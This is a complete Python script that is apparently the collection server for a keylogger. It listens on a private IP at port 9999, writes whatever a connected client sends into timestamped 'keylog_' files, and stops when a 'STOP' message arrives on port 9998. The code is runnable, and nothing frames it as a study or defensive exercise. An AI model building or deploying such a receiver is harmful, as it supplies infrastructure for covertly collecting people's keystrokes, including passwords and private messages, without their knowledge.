import socket
import os
import threading
from datetime import datetime

def start_server():
    server_ip = '192.168.56.1'  # Replace with your server's IP address
    server_port = 9999

    # Write the server IP to a file in the same directory as the script
    with open(os.path.join(os.path.dirname(__file__), 'server_ip.txt'), 'w') as f:
        f.write(server_ip)

    stop_event = threading.Event()

    def listen_for_stop_signal():
        stop_signal_port = 9998
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as stop_socket:
            stop_socket.bind((server_ip, stop_signal_port))
            stop_socket.listen()
            conn, addr = stop_socket.accept()
            with conn:
                data = conn.recv(1024)
                if data.decode('utf-8') == 'STOP':
                    stop_event.set()

    threading.Thread(target=listen_for_stop_signal, daemon=True).start()

    # Create a directory to store the logs if it doesn't exist
    log_dir = 'received_logs'
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((server_ip, server_port))
        s.listen()
        print(f"Server started at {server_ip}:{server_port}")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_file_path = os.path.join(log_dir, f'keylog_{timestamp}.txt')
            with open(log_file_path, 'a') as log_file:
                while not stop_event.is_set():
                    data = conn.recv(1024)
                    if not data:
                        break
                    log_file.write(data.decode('utf-8'))
            print(f"Log saved to {log_file_path}")
            print("Stopping server...")

if __name__ == "__main__":
    start_server()
